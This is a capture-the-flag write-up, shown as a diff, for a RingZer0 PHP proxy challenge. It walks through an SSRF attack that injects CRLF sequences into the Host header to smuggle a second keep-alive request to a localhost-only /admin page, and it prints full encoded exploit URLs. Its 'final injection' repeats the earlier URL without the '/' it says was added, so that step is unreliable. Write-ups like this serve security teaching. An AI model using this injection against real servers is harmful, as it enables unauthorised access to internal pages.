@@ -1,0 +1,69 @@
+   Looking at the source code, we see that this challenge is very similar to the orginal.
+Who would've thought! The difference is that for this one, our input is used to build
+an HTTP request, rather than a shell command.
+
+This looks an awful lot like an SSRF vulnerability...
+So what page or site could be available only from localhost?
+An admin page maybe? Let's try that by visiting:
+
+    http://challenges.ringzer0team.com:10241/admin
+
+We can a 403 (Forbidden), so it looks like the page exists, which is a good sign!
+To confirm, we can try a page that surely doesn't exist:
+
+    http://challenges.ringzer0team.com:10241/whatever
+
+This time we get a 404 (Not found), so it looks like we're on the right track!
+
+Now we need to actually build our exploit.
+Restrictions are the same as the original 'PHP feature of 0day?' challenge, so we can
+use the same tricks to bypass them, namely sending:
+
+    localhost:80<whatever>
+
+...replacing <whatever> with anything we want.
+
+So the HTTP request is built like this:
+
+    $request = "GET / HTTP/1.1\r\nHost: " . $ip . "\r\nConnection: close\r\n\r\n";
+
+It's then simply sent to the open socket. So this means we're effectively doing:
+
+    GET / HTTP/1.1
+    Host: localhost:80<whatever>
+    Connection: close
+
+And this is sent to localhost:80.
+Now, we can't modify the path of this request, because it comes before the part we control.
+However, we can add a second request! So we want to do this:
+
+    GET / HTTP/1.1
+    Host: localhost:80
+    Connection: keep-alive
+
+    GET /admin HTTP/1.1
+    Host: localhost
+    Connection: close
+
+Having 'Connection: keep-alive' on the first request is important, because otherwise Apache will
+close the connection before executing the second request.
+So what we need to inject is this:
+
+    localhost:80
+    Connection: keep-alive
+
+    GET /admin HTTP/1.1
+    Host: localhost
+
+After URL-encoding that without forgetting the carriage returns, we can send it to the proxy:
+
+    http://challenges.ringzer0team.com:10241/proxy.php?url=localhost:80%0D%0AConnection:%20keep-alive%0D%0A%0D%0AGET%20/admin%20HTTP/1.1%0D%0AHost:%20localhost
+
+We get a 302 (Moved permanently) with 'Location: http://localhost/admin/'. We're missing a '/'!
+Adding that in, we get our final injection:
+
+    http://challenges.ringzer0team.com:10241/proxy.php?url=localhost:80%0D%0AConnection:%20keep-alive%0D%0A%0D%0AGET%20/admin%20HTTP/1.1%0D%0AHost:%20localhost
+
+And that gives us the flag:
+
+       xxxxxx
